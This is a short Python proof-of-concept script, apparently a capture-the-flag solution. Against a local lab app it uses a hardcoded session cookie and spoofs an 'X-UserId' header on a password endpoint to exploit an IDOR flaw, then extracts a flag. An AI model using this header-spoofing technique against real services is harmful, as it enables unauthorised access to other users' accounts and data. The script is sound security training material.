import requests
import re
from urllib.parse import urlencode

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

print("=" * 80)
print("FLAG VERIFICATION")
print("=" * 80)

print("\n[!] VULNERABILITY CONFIRMED: IDOR via X-UserId Header")
print("-" * 80)

# Reproduce the finding with X-UserId=10052
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'X-UserId': '10052'  # This triggers the IDOR
}

form_data = {'username': 'test', 'password': 'test', 'user_id': '10032'}

print("\nRequest details:")
print(f"  Endpoint: POST {BASE_URL}/password/test")
print(f"  Headers: {headers}")
print(f"  Form data: {form_data}")

r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers)

print(f"\nResponse:")
print(f"  Status: {r.status_code}")

flag_match = re.search(r'FLAG\{[^}]+\}', r.text)
if flag_match:
    FLAG = flag_match.group(0)
    print(f"\n[!] FLAG EXTRACTED: {FLAG}")
    print(f"\nFull response containing flag:\n{r.text}")
else:
    print(f"\n[X] Flag not found in response")
    print(f"Response:\n{r.text[:2000]}")

print("\n" + "=" * 80)
print("VERIFICATION COMPLETE")
print("=" * 80)

